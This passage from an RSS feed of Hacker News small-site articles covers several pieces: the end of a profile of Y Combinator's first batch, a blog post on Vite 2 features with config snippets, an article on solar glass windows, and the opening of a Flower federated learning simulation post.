<p><span>Like some of the other startups to come from Y Combinator’s First Batch, Simmary Axe shut down not long after the summer program ended. Its founder, Jesse Tov, hasn’t spent much time as an entrepreneur since, trading the startup life for academia. He now teaches computer science at Northwestern University. Before teaching, Tov spent time with the U.S. Navy Fleet Numerical Meteorology and Oceanography Center.</span></p>
<h2><b>1. Jessica Livingston<br></b><b>16. <b>Paul Graham</b></b></h2>
<p><b><b><img alt="" height="393" src="https://static.media.thinknum.com/media/uploads/.thumbnails/jessica-livingston-and-paul-graham.jpg/jessica-livingston-and-paul-graham-700x393.jpg" width="700"><span></span></b></b></p>
<p><b>Founders, Y Combinator<br></b><b>Where are they now?<br></b><b>Both Graham and Livingston still run Y Combinator.</b></p>
<p><span>As for Paul Graham and Jessica Livingston, the husband and wife duo&nbsp;have ceased running the startup accelerator day to day, and now have&nbsp;a full-time staff. Graham, who stepped down in 2014, has been called a “startup guru” for the major companies&nbsp;that have come out of YC. In recent years, Graham has authored numerous essays on startups and company growth, becoming one of the greatest minds behind Silicon Valley in the process.&nbsp;</span></p>
<p><span>Livingston also had a hands-on role in the early days of Y Combinator. Before getting married in 2008, Graham and Livingston were dating while running YC, and according to Graham, the program felt like a family. Today, Livingston is on sabbatical, but lives with Graham and their two children in England.</span></p>
<p><em>Note: the names of&nbsp;founders 7, 9, and 12 aren't known, and their startups aren't listed on the <a href="https://www.ycombinator.com/companies/?batch=S05">Y Combinator page</a> for the First Batch.</em></p>
      

      

      



    </section><!-- .article-body -->

    
  </div></div>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/y-combinator-where-are-they-now-first-batch-reddit-twitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779621</guid>
            <pubDate>Thu, 14 Jan 2021 17:56:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vite 2, a DX jump into the future]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779588">thread link</a>) | @marianabeldi
<br/>
January 14, 2021 | https://patak.dev/web/vite-2.html | <a href="https://web.archive.org/web/*/https://patak.dev/web/vite-2.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-6204d012=""><div data-v-6204d012=""><p><a href="https://github.com/vitejs" target="_blank" rel="noopener noreferrer">Vite</a> is a next-generation frontend tool. It generates optimized builds using the battle-tested bundler <a href="https://rollupjs.org/" target="_blank" rel="noopener noreferrer">rollup</a>. But during dev, bundling is avoided with files served on-demand over native ESM. It has Hot Module Replacement (HMR) that stays fast independently of your codebase size.</p><p>This post discusses why the instant feedback loop unlocked by Vite is so important and what is new in the next iteration of Vite, which is currently in beta. Be sure to check out <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">the new Vite docs site</a>, built with <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitePress</a>.</p><ul><li><a href="#frontend-tooling-is-evolving">Frontend tooling is evolving</a></li><li><a href="#powered-by-vitepress">Powered by VitePress</a></li><li><a href="#what-is-new-in-vite-2">What is new in Vite 2</a><ul><li><a href="#vite-docs">Vite docs</a></li><li><a href="#framework-agnostic-core">Framework agnostic core</a></li><li><a href="#universal-plugin-format">Universal plugin format</a></li><li><a href="#error-overlay">Error Overlay</a></li><li><a href="#lib-mode">Lib Mode</a></li><li><a href="#multi-entry-mode">Multi entry mode</a></li><li><a href="#strong-caching-of-npm-deps">Strong caching of npm deps</a></li><li><a href="#other-highlights">Other Highlights</a></li></ul></li><li><a href="#feeling-the-speed">Feeling the speed</a></li><li><a href="#an-immediate-connection">An immediate connection</a></li></ul><p><a href="https://github.com/vitejs/vite" target="_blank" rel="noopener noreferrer">Vite</a>'s novel approach to web dev tooling, <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">together</a> with <a href="https://modern-web.dev/docs/dev-server/overview/" target="_blank" rel="noopener noreferrer">@web/dev-server</a> and <a href="https://www.snowpack.dev/" target="_blank" rel="noopener noreferrer">Snowpack</a>, paved the way to a renaissance in dev tools exploration. Removing bundling during dev through JIT transpilations of files in a dedicated server allowed these projects to offer an incredible fast feedback loop while developing without losing the state of art optimizations like bundling and minification for production builds.</p><p>The release of <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a> from the Preact team solidified this path and brought new ideas to the table. In particular, their universal plugin format based on rollup plugins let them and other devs share the same transform code in dev and build time. Vite 2 continues this exploration, incorporating what is proving to work well in Snowpack and WMR and taking the opportunity to apply what has been learned in the past months.</p><p>All of these tools are framework agnostic, you can use Vite to develop React with fast refresh for example. But, interestingly, the teams behind Vue, Preact, and Svelte are at the forefront of this new generation of dev tools. Vite is being developed by <a href="https://twitter.com/youyuxi" target="_blank" rel="noopener noreferrer">Evan You</a> and the Vue community, WMR is an effort from the Preact ecosystem and the Svelte guild will surely get more involved in Snowpack dev now that they have chosen it for <a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit" target="_blank" rel="noopener noreferrer">Svelte Kit</a>. I think this marks an inflection point for UI frameworks, and we will see a lot of innovation in DX, SSR, and SSG in the future.</p><h2 id="powered-by-vitepress"> Powered by VitePress</h2><p><a href="https://patak.dev/" target="_blank" rel="noopener noreferrer">This page</a> is built using <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitepPress</a>, which now uses Vite 2. It is a great way to experience the developing flow that Vite unlocks. VitePress is a Vue-powered static site generator that is pushing the boundaries in both DX and performance. Because of the use of templates in Vue, static blocks can be detected to avoid hydration penalties. Dynamic Vue components can still be interleaved in markdown.</p><p>The post is converted into a vue component so the composition API can be used to add reactive state to your documents. Components can also be imported and used in the markdown. VitePress is still able to identify the static parts of the post and only include the minimal code needed to hydrate the dynamic blocks.</p><div><pre><code><span><span><span>&lt;</span>script</span> <span>setup</span><span>&gt;</span></span><span><span>
<span>import</span> FiltersPlayground <span>from</span> <span>'./FiltersPlayground.vue'</span>
</span></span><span><span><span>&lt;/</span>script</span><span>&gt;</span></span>

<span><span>#</span> CSS Filters Playground</span>

Use the component in your markdown docs

<span><span><span>&lt;</span>FiltersShowcase</span><span>/&gt;</span></span>
</code></pre></div><div data-v-6204d012="" data-v-0b49e0db=""><p><img src="https://patak.dev/images/vite-2.jpg" alt="Vue in Markdown, CSS Filters Playground" data-v-0b49e0db=""></p><div data-v-0b49e0db=""><!--[--><p><label for="blur" data-v-0b49e0db="">blur</label></p><p><label for="hue-rotate" data-v-0b49e0db="">hue-rotate</label></p><p><label for="invert" data-v-0b49e0db="">invert</label></p><p><label for="grayscale" data-v-0b49e0db="">grayscale</label></p><p><label for="sepia" data-v-0b49e0db="">sepia</label></p><p><label for="saturate" data-v-0b49e0db="">saturate</label></p><p><label for="brightness" data-v-0b49e0db="">brightness</label></p><p><label for="contrast" data-v-0b49e0db="">contrast</label></p><p><label for="opacity" data-v-0b49e0db="">opacity</label></p><!--]--></div></div><p>When you are playing with the sliders, you may arrive at a pleasant result by exploration. It is possible because you see the results of your changes instantly. If you need to wait even a few seconds when changing the values, it can't work. The same idea applies to Vite. It enables us to craft our apps or pages with a tight feedback loop. We see the result of our changes immediately, and it opens the door to workflows that were not possible before.</p><h2 id="what-is-new-in-vite-2"> What is new in Vite 2</h2><p>You can check <a href="https://github.com/vitejs/vite/issues/1207" target="_blank" rel="noopener noreferrer">the discussion</a> that Evan started with the rationale for this next iteration. For a complete list of features check the <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">Vite docs</a>. It already supported most of the common dev flows out of the box, like JSX, Typescript, importing CSS and JSON, and also powerful features like <a href="https://vitejs.dev/guide/features.html#web-assembly" target="_blank" rel="noopener noreferrer">importing wasm files</a> and <a href="https://vitejs.dev/guide/features.html#web-workers" target="_blank" rel="noopener noreferrer">inline Web Workers</a>. What follows is a list of the biggest changes and new features in the new release.</p><h3 id="vite-docs"> Vite docs</h3><p>Vite has a new <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">docs site</a> built with <a href="https://vitepress.vuejs.org/" target="_blank" rel="noopener noreferrer">VitePress</a>. This is a great example of the dogfooding that is prevalent in the Vue ecosystem. In this case, previously with VuePress and now with Vite and VitePress, they can find issues and optimizations in vue core by pushing the envelope of what a SSG based in Vue can achieve.</p><p><a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-docs.jpg" alt=""></a></p><p>The <a href="https://vitejs.dev/guide/features.html" target="_blank" rel="noopener noreferrer">Features page</a> is an excellent place to learn about Vite 2 out of the box features. If you are migrating from Vite v1, check the <a href="https://vitejs.dev/guide/migration.html" target="_blank" rel="noopener noreferrer">dedicated migration page</a>. There is also a <a href="https://vitejs.dev/config/" target="_blank" rel="noopener noreferrer">Config reference</a> available. There is also a <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">Comparisons page</a> that is a good place to learn about the different tradeoffs that Vite is taking compared to other tools.</p><p>There is an official <a href="https://github.com/vitejs/awesome-vite" target="_blank" rel="noopener noreferrer">Awesome Vite List</a> for community plugins, apps using Vite, and other interesting resources around the Vite ecosystem.</p><h3 id="framework-agnostic-core"> Framework agnostic core</h3><p>All Vue related handling has been moved to a <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-vue" target="_blank" rel="noopener noreferrer">dedicated plugin</a>, that plays by the same rules as the plugins for other frameworks like React, Preact, and Svelte. The <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-react-refresh" target="_blank" rel="noopener noreferrer">react plugin</a> is also part of the monorepo. The new <a href="https://github.com/vitejs/vite/tree/main/packages" target="_blank" rel="noopener noreferrer">monorepo organization</a> of the repository showcases this move:</p><div><pre><code>packages
  create-app
  playground
  plugin-legacy
  plugin-react-refresh
  plugin-vue-jsx
  plugin-vue
  vite
</code></pre></div><h3 id="new-universal-plugin-format"> New universal plugin format</h3><p>The new <a href="https://vitejs.dev/guide/api-plugin.html" target="_blank" rel="noopener noreferrer">vite plugins</a> format, <a href="https://vitejs.dev/guide/comparisons.html#wmr" target="_blank" rel="noopener noreferrer">inspired</a> by the work of <a href="https://github.com/preactjs/wmr" target="_blank" rel="noopener noreferrer">WMR</a>, enables to share plugins code at dev and build time. From Vite's source docs:</p><blockquote><p>Vite plugins support a subset of Rollup plugin API with a few extra vite-specific options. A valid vite plugin is also a valid Rollup plugin. On the contrary, a Rollup plugin may or may NOT be a valid vite universal plugin, since some Rollup features do not make sense in an unbundled dev server context. That said, as long as a rollup plugin doesn't have strong coupling between its bundle phase and output phase hooks then it should just work (that means, most of them). By default, the plugins are run during both serve and build. When a plugin is applied during serve, it will only run <strong>non output plugin hooks</strong> (see rollup type definition of <a href="https://rollupjs.org/guide/en/#build-hooks" target="_blank" rel="noopener noreferrer">Rollup Plugin Hooks</a>). You can think of the dev server as only running <code>const bundle = rollup.rollup()</code> but never calling <code>bundle.generate()</code>.</p></blockquote><p>This new plugin format allows Vite to reuse a log of plugins from the rollup ecosystem and also share more code with WMR. I am maintaining a list of Vite compatible official rollup plugins at <a href="https://vite-rollup-plugins.patak.dev/" target="_blank" rel="noopener noreferrer">Vite Rollup Plugins</a>.</p><h3 id="error-overlay"> Error overlay</h3><p>Following other tools, Vite will now display an error overlay in the browser when there is a compiler error or failed resolve in the code. This feature can be disabled using <code>hmr: { overlay: false }</code> in <code>vite.config.js</code></p><p><a href="https://twitter.com/youyuxi/status/1338323327971110912" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-error-overlay.jpg" alt=""></a></p><h3 id="lib-mode"> Lib mode</h3><p>Vite now supports <a href="https://twitter.com/youyuxi/status/1343291778745720834" target="_blank" rel="noopener noreferrer">building libraries</a>. Changes to the source code will be watched by Vite, so for browser-centric libs, you can have a great dev experience and optimized builds. The following config defaults to building the library in both <code>'es'</code> and <code>'umd'</code> format. <code>'cjs'</code> and <code>'iife'</code> can be added using <a href="https://vitejs.dev/config/#build-lib" target="_blank" rel="noopener noreferrer"><code>formats</code></a>.</p><p><code>vite.config.js</code></p><div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  build<span>:</span> <span>{</span>
    lib<span>:</span> <span>{</span>
      entry<span>:</span> path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>'src/main.js'</span><span>)</span><span>,</span>
      name<span>:</span> <span>'LibName'</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div><h3 id="multi-entry-mode"> Multi entry mode</h3><p>There can now be multiple entry points, and Vite will perform <a href="https://twitter.com/youyuxi/status/1341864579182301191" target="_blank" rel="noopener noreferrer">auto code splitting for JS and CSS</a> when building them.</p><p><code>vite.config.js</code></p><div><pre><code><span>const</span> <span>{</span> resolve <span>}</span> <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>

module<span>.</span>exports <span>=</span> <span>{</span>
  build<span>:</span> <span>{</span>
    rollupOptions<span>:</span> <span>{</span>
      input<span>:</span> <span>{</span>
        main<span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'index.html'</span><span>)</span><span>,</span>
        nested<span>:</span> <span>resolve</span><span>(</span>__dirname<span>,</span> <span>'nested/index.html'</span><span>)</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div><h3 id="strong-caching-of-npm-deps"> Strong caching of npm deps</h3><p>When importing <a href="https://vitejs.org/guide/features.html#npm-depndency-resolving" target="_blank" rel="noopener noreferrer">npm dependencies</a>, they will now be using disk or memory cache after the first load. The cache will auto invalidates if you upgrade the dependency to a newer version, but the imports will not even hit the dev server once they are cached by the browser.</p><p><a href="https://twitter.com/youyuxi/status/1341787928540930048" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-dependencies.jpg" alt=""></a></p><h3 id="other-highlights"> Other highlights</h3><p>There are a lot of other important improvements in the new version. These are some of the enhancements that are not expanded in this post:</p><ul><li>Middleware mode, allowing Vite to run as part of existing express compatible servers</li><li>Default to modern only, Opt-in to legacy mode</li><li><a href="https://vitejs.dev/guide/migration.html#config-options-change" target="_blank" rel="noopener noreferrer">Revised config format</a></li><li>Smaller and faster install</li><li><a href="https://vitejs.dev/guide/api-javascript.html" target="_blank" rel="noopener noreferrer">Improved JS API</a></li><li><a href="https://vitejs.dev/guide/migration.html#hmr-api-change" target="_blank" rel="noopener noreferrer">HMR API alignment with other tools</a></li><li>Improved alias and resolving</li><li>Better vue perf (single request in most cases)</li><li>Support native esm config files</li><li>Auto restart server on config and .env changes</li><li>Support for <a href="https://github.com/vitejs/vite/tree/main/packages/plugin-vue-jsx" target="_blank" rel="noopener noreferrer">Vue JSX with HMR</a></li><li>Support using variables in dynamic imports, like <code>await import(`./views/${view}.js`)</code></li></ul><h2 id="feeling-the-speed"> Feeling the speed</h2><p>As Evan You <a href="https://www.youtube.com/watch?v=xXrhg26VCSc" target="_blank" rel="noopener noreferrer">has said</a>, you need to try it out to get a feeling of the raw speed that Vite is capable of. To <a href="https://vitejs.dev/guide/#scaffolding-your-first-vite-project" target="_blank" rel="noopener noreferrer">scaffold a new vite App</a> you can use</p><p>You will be prompted to choose a project name and a template</p><div><pre><code>√ Project name: · next-gen-app
Scaffolding project <span>in</span> path/next-gen-app<span>..</span>.
? Select a template: <span>..</span>.
<span>&gt;</span> vanilla
  vue
  vue-ts
  react
  react-ts
  preact
  preact-ts
</code></pre></div><p>Once the app is created, start the dev server with</p><div><pre><code><span>cd</span> next-gen-app
<span>yarn</span>
<span>yarn</span> dev
</code></pre></div><p>Modify the files with the browser open to see your modifications be reflected instantly. A nice way to test how fast Vite updates the app is to toggle auto save, and then play with CSS or modify the files. It should feel like you are directly using the browser dev tools (in <a href="https://code.visualstudio.com/docs/editor/codebasics#_save-auto-save" target="_blank" rel="noopener noreferrer">VS Code</a>, you can enable it using <code>Cmd+Shift+P</code> then type "Auto Save" and fire the <code>File: Toggle Auto Save</code> action).</p><p>If you would like to see how it works for a real application, at <a href="https://www.leniolabs.com/" target="_blank" rel="noopener noreferrer">Leniolabs_</a> we have been using Vite to craft <a href="https://grid.layoutit.com/" target="_blank" rel="noopener noreferrer">Layoutit Grid</a> and we recently migrated it to Vite 2 as part of the work we are doing for grid v2. You can <a href="https://github.com/Leniolabs/layoutit-grid" target="_blank" rel="noopener noreferrer">clone the repo</a> and play with the dev server.</p><p>There will continue to be a lot of <a href="https://vitejs.dev/guide/comparisons.html" target="_blank" rel="noopener noreferrer">healthy cross-pollination</a> between the Vite, Snowpack, and WMR. These tools are paving the way for a future where we can get back to have that lost magical experience of an instant feedback loop between our code changes and our pages. Like <a href="http://worrydream.com/" target="_blank" rel="noopener noreferrer">Bret Victor</a> said in his marvelous talk <a href="https://youtu.be/PGDrIy1G1gU" target="_blank" rel="noopener noreferrer">Inventing on Principle</a>, creators need an immediate connection to what they are creating.</p><p><a href="https://100.antfu.me/005?q=(cos(2t*(r-1))-sin(t%2B5*th))*.5+" target="_blank" rel="noopener noreferrer"><img src="https://patak.dev/images/vite-2-polar.jpg" alt=""></a></p><p>A good example of this principle in practice was <a href="https://twitter.com/aemkei/status/1323399877611708416" target="_blank" rel="noopener noreferrer">the release</a> of <a href="https://tixy.land/" target="_blank" rel="noopener noreferrer">tixy.land by …</a></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://patak.dev/web/vite-2.html">https://patak.dev/web/vite-2.html</a></em></p>]]>
            </description>
            <link>https://patak.dev/web/vite-2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779588</guid>
            <pubDate>Thu, 14 Jan 2021 17:53:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Solar Glass Changing the World of Renewable Solar Energy]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779535">thread link</a>) | @scottbucks
<br/>
January 14, 2021 | https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities | <a href="https://web.archive.org/web/*/https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><h3 id="viewer-foo"><span><span>This technology can turn any window into an energy-generating panel</span></span></h3><div id="viewer-761ht"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities" data-pin-media="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_1000%2Ch_1000%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/nsplsh_2f1962e8a60e41f8a571b853e38e7981~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-m9ue"><span>Photo-voltaic modules (otherwise known as <strong>Solar Panels</strong>)<!-- --> have been around for a while, allowing us to <!-- -->use <!-- -->sunlight<!-- --> as a source of energy<!-- -->. The issue with solar panels is that they need sufficient space on rooftops or on the ground to produce enough energy for them to be worth it, space that is limited in big cities. </span></p><p id="viewer-dkhis"><span>In recent years, companies have been working on a solution to this problem: <strong>Solar Glass</strong> (often referred to as "Solar Windows"), which can turn windows into power-generating panels.</span></p><h2 id="viewer-efmla"><span>What is Solar Glass?</span></h2><p id="viewer-8bpoh"><span>Solar glass is used to replace conventional <!-- -->building<!-- --> materials<!-- --> in parts such as the roof, skylights, facades and windows<!-- -->, whilst also generating electricity on-site.</span></p><p id="viewer-5gpt4"><span>The key difference between this recent technology and traditional solar PV (Photo-voltaic) is that the panels are built into the building rather than being added on. This allows for more of a relationship between aesthetics and functionality.</span></p><p id="viewer-5v8m5"><span>The most common type of Solar Glass is <strong>T</strong><strong>hin-film modules</strong> (e.g. amorphous silicon, cadmium telluride) which<!-- --> been around for a few years. They can be designed into the fabric of a building and can perform in conditions/locations where crystalline silicon panels (conventional solar panels) cannot. </span></p><p id="viewer-e6r4b"><span>This solar glass has a varying efficiency that depends on it's<!-- --> opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><h3 id="viewer-4um67"><span><span>Suggested Articles:</span></span></h3><ul><li id="viewer-49mml"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-f6604"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li><li id="viewer-6hik8"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li></ul><h2 id="viewer-2oa4c"><span>Why use Solar Glass? </span></h2><p id="viewer-nkfr"><span>In the current state that the world is in, we need to start properly transitioning away from fossil fuels and towards renewable energy if we want to reduce our <a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><u>carbon emissions</u></a>. There are several options when it comes to renewable energy: <!-- -->Wind, Hydro, Tidal, Geothermal, Biomass and of course Solar energy.</span></p><p id="viewer-4befc"><span>Sunlight is one of our planet’s most abundant and freely available energy resources. The amount of solar energy that reaches the earth’s surface in one hour is more than the planet’s total energy requirements for a whole year so trying to harness that energy seems obvious.</span></p><p id="viewer-etkau"><span>Up until now, <!-- -->crystalline silicon Solar Panels have accounted <!-- -->opacity which it's self varies between 50% transparent and fully opaque. The greater opacity they have, the more efficient they'll be, but on the other hand, being less transparent will allow less light to penetrate through.</span></p><p id="viewer-36bae"><span>For big cities on the other hand, where most buildings are several stories high, close together and made primarily out of glass, there's simply not enough space, which is why solar glass, with the ability to turn these glass windows into energy-generating panels, seems like the perfect solution. </span></p><h3 id="viewer-6r5bk"><span>Other benefits to solar glass</span></h3><p id="viewer-dk9sg"><span>Other than producing electricity, solar glass offers several other benefits when <a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>integrated into buildings</u></a>:</span></p><ul><li id="viewer-ccm8d"><p><strong>Transparency</strong> allows for light to penetrate the building whilst also providing <strong><span>shading and glare control</span></strong><span>.</span></p></li><li id="viewer-c9trm"><p>T<span>hanks to their multi-layer structure, Solar modules possess <strong>sound insulating properties</strong>. The insulation can even be adjusted by increasing or decreasing the thickness of the glazing.</span></p></li><li id="viewer-76vie"><p><span>Because the temperature of a PV module can increase significantly when the module is exposed to radiation, the heat it then radiates can be harnessed to provide <strong>t</strong></span><strong>hermal control</strong> like <strong>thermal insulation</strong>, <strong>reduction in thermal gain</strong>. </p></li><li id="viewer-9uuc2"><p><strong>Aesthetics</strong>: Different colours and effects can be applied to Solar Glass.</p></li></ul><h2 id="viewer-bamr9"><span>Where can it be used?</span></h2><p id="viewer-3r7su"><span>Solar Glass technology can be used in many different applications thanks to it's partial transparency making it much more versatile, for example:</span></p><ul><li id="viewer-bg9bs"><p><strong>Solar Windows</strong> are probably the most obvious way of using this technology, allowing skyscrapers for example to have power-generating facades.</p></li><li id="viewer-111bt"><p>Solar Glass can also be used for <strong>Bus Stops.</strong> </p></li></ul><ul><li id="viewer-4mp8j"><p><strong>Atriums</strong> and <strong>skylights.</strong></p></li><li id="viewer-11ues"><p>It's also perfect for <span><strong>privacy protection panels</strong> because it doesn't let in too much light seeing as it can only go up to 50% transparency.</span></p></li></ul><h2 id="viewer-6cqjg"><span><span>The Solar Glass pioneers </span></span></h2><p id="viewer-7jpbo"><span><span>There are many companies around the world working on making Solar Glass mainstream, here are some of the pioneers.</span></span></p><h3 id="viewer-fd55"><span><span>Ubiquitous Energy</span></span></h3><p id="viewer-1aokf"><span>First off there is <a href="https://ubiquitous.energy/" target="_blank" rel="noopener"><u>Ubiquitous Energy</u></a>, a Silicon Valley technology company leading the development of next-generation solar technologies. Born from research at MIT and Michigan State University, founded on the principle of seamlessly integrating solar technology into everyday products and surfaces. They have since developed a transparent solar coating that integrates into standard windows, with endless possibilities for future applications.</span></p><h3 id="viewer-enp20"><span>Physee</span></h3><p id="viewer-1n23a"><span>The European manufacturer <a href="https://www.physee.eu/" target="_blank" rel="noopener"><u>Physee</u></a> was actually the first to install transparent solar panels. The company developed a technology they call the "Power Bar" which is small solar panels that are installed along the window pane edges to generate power.</span></p><p id="viewer-dihln"><span>Physee is also working on <!-- -->power generating glass coating. It directs sunlight onto integrated solar cells in PowerWindows. Without impacting the transparency of its glass, windows will produce the same energy as 1/5 of a solar panel placed on a building's roof.</span></p><h2 id="viewer-dc5n2"><span>Bottom Line</span></h2><p id="viewer-igh5"><span>The bottom line is that, although this technology is not yet widely available and still in it's early stages, Solar Glass seems like a very promising new way to generate electricity from the sun. With companies continuing to innovate and improve their products, we may well be seeing our first Solar Glass buildings within the next decade, let's wait and see!</span></p><p id="viewer-58ct9"><span><strong>Sources:</strong></span></p><p id="viewer-8ll7g"><span><strong>- </strong><a href="https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows" target="_blank" rel="noopener"><u>https://www.spiritenergy.co.uk/kb-solar-glass-photovoltaic-windows</u></a> </span></p><p id="viewer-97jl"><span><strong>- </strong><a href="https://ubiquitous.energy/about/" target="_blank" rel="noopener"><u>https://ubiquitous.energy/about/</u></a> </span></p><p id="viewer-8togt"><span>- <a href="https://www.physee.eu/innovation/coating" target="_blank" rel="noopener"><u>https://www.physee.eu/innovation/coating</u></a> </span></p><p id="viewer-570b8"><span>- <a href="https://solarmagazine.com/solar-panels/transparent-solar-panels/" target="_blank" rel="noopener"><u>https://solarmagazine.com/solar-panels/transparent-solar-panels/</u></a> </span></p><h3 id="viewer-40d8a"><span><span><strong>More from The Detechtor:</strong></span></span></h3><ul><li id="viewer-d442b"><p><strong>🚄 </strong><a href="https://www.thedetechtor.com/post/hyperloop-the-future-of-travel" target="_blank" rel="noopener"><strong><u>Hyperloop, the future of travel?</u></strong></a></p></li><li id="viewer-60rl6"><p><span><strong>🏭 </strong></span><a href="https://www.thedetechtor.com/post/carbon-capture-usage-and-storage-the-solution-to-the-climate-crisis" target="_blank" rel="noopener"><strong><u>Carbon Capture, Usage and Storage: The Solution to the Climate Crisis?</u></strong></a></p></li><li id="viewer-5srnl"><p><strong>📱 </strong><a href="https://www.thedetechtor.com/post/smartphones-the-true-cost-of-upgrades" target="_blank" rel="noopener"><strong><u>Smartphones: The True Cost of Upgrades</u></strong></a><strong> ♻️</strong></p></li></ul><h3 id="viewer-cbj21"><span><span>Stay updated:</span></span></h3><ul><li id="viewer-7c1et"><p>📩 Want the latest on the impact of tech? <strong>Subscribe</strong> to our <strong>newsletter</strong>!</p></li><li id="viewer-6bd12"><p>🎙 <a href="http://thedetechtor.com/" target="_blank" rel="noopener"><u>The Detechtor Podcast</u></a> is available on all podcast players!                                                      <strong>Subscribe</strong> on <a href="https://podcasts.apple.com/fr/podcast/the-detechtor-podcast/id1537457578?l=en" target="_blank" rel="noopener"><u>Apple Podcasts</u></a> | <a href="https://open.spotify.com/show/5kc8WA6nZC69bQ1sbOrlNi?si=CwAuAtpfRpe7WmLu1PlO8w" target="_blank" rel="noopener"><u>Spotify</u></a> | <a href="https://podcasts.google.com/search/The%20detechtor%20Podcast" target="_blank" rel="noopener"><u>Google Podcasts</u></a> | <a href="https://www.stitcher.com/show/the-detechtor-podcast" target="_blank" rel="noopener"><u>Stitcher</u></a> | <a href="https://tunein.com/podcasts/Technology-Podcasts/The-Detechtor-Podcast-p1377296/?topicid=158813573" target="_blank" rel="noopener"><u>Tunein</u></a></p></li><li id="viewer-4tmjb"><p>📲 Let's connect! <strong>Follow</strong> <strong>us</strong> on <a href="https://twitter.com/the_detechtor" target="_blank" rel="noopener"><u>Twitter</u></a> | <a href="https://www.instagram.com/thedetechtor/" target="_blank" rel="noopener"><u>Instagram</u></a> | <a href="https://www.facebook.com/thedetechtor" target="_blank" rel="noopener"><u>Facebook</u></a> | <a href="https://www.youtube.com/channel/UCAW--4_mML4A86W3670ix3w" target="_blank" rel="noopener"><u>Youtube</u></a></p></li></ul></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.thedetechtor.com/post/solar-glass-energy-in-big-cities</link>
            <guid isPermaLink="false">hacker-news-small-sites-25779535</guid>
            <pubDate>Thu, 14 Jan 2021 17:50:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Single-Machine Simulation of Federated Learning Systems]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25779486">thread link</a>) | @tanto
<br/>
January 14, 2021 | https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems | <a href="https://web.archive.org/web/*/https://flower.dev/blog/2021-01-14-single-machine-simulation-of-federated-learning-systems">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>This is the first part in a series of blog posts that demonstrate how a single-machine Federated Learning simulation can be scaled up to a large number of clients involving multiple machines. Initially you will learn how to create a simulation with Flower and in the second part distribute the simulation to multiple machines. In the third part of this series you will learn how to run each Federated Learning client on a single dedicated machine and configure Flower so that you can scale to far more clients. In each subsequent part we will build upon the previous code.</p><blockquote><p>Federated Learning brings together people from a diverse set of backgrounds. Building FL systems requires expertise in machine learning, distributed systems, software engineering, and operations, to name just a few.
